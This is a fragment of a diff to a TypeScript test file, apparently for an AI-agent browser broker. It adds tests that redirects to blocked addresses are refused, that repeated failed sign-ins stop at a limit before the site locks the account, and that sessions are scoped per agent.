+      const shot = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/bounce` }, { action: "screenshot" }] });
+      expect(shot.result.code).toBe("FLEET_BROWSER_URL_BLOCKED");
+      expect(shot.result.files).toBeUndefined();
+      // A dead link is not a refused address: it stays an ordinary failed page.
+      const dead = await browse(A, "browser.act", { sessionId: o.sessionId, steps: [{ action: "goto", url: `${SITE}/atk/dead` }, { action: "click", selector: "#dead" }] });
+      expect(dead.result.code, JSON.stringify(dead.result)).not.toBe("FLEET_BROWSER_URL_BLOCKED");
+      await browse(A, "browser.close", { sessionId: o.sessionId });
+    } finally { (worker as any).hosts = new HostResolutionPolicy(); }
   });
+
+  it("v126: too many sign-ins in an hour stop before the site locks the account out", async () => {
+    const who = "ownerlimit", password = `Owner-${crypto.randomUUID()}`;
+    users.set(who, { email: "o@site.test", password: "something-else", verified: true });
+    const pub = Buffer.from((broker as any).o.ownerVault.publicKeyBase64(), "base64");
+    const x = (await R.q(`SELECT fleet.fleet_admin_account_handover($1, 'marketplace', 'flow.test', $2, $3, $4, $5) AS r`, [A.id, `${SITE}/login`, who, sealAccountLogin(pub, { agentId: A.id, platform: "flow.test", handle: who, loginUrl: `${SITE}/login` }, JSON.stringify({ password })), OWNER]))[0].r as any;
+    await broker.tick();
+    const id = (await ok(R.econ(A, "browser.open", { url: `${SITE}/out`, accountId: x.accountId }))).sessionId as string;
+    await browse(A, "browser.observe", { sessionId: id });
+    for (let i = 0; i < 5; i++) expect((await browse(A, "browser.act", { sessionId: id, steps: [{ action: "sign_in" }] })).result.code, `try ${i}`).toBe("FLEET_SIGNIN_FAILED");
+    expect((await browse(A, "browser.act", { sessionId: id, steps: [{ action: "sign_in" }] })).result.code).toBe("FLEET_SIGNIN_LIMIT");
+    await browse(A, "browser.close", { sessionId: id });
+  }, 120_000);
 
   it("scope and reach: sessions are per agent; private addresses are unreachable; roles are least-privilege", async () => {
     sessionId = (await browse(A, "browser.open", { url: `${SITE}/login`, accountId })).sessionId; // the old one ended with the worker restart
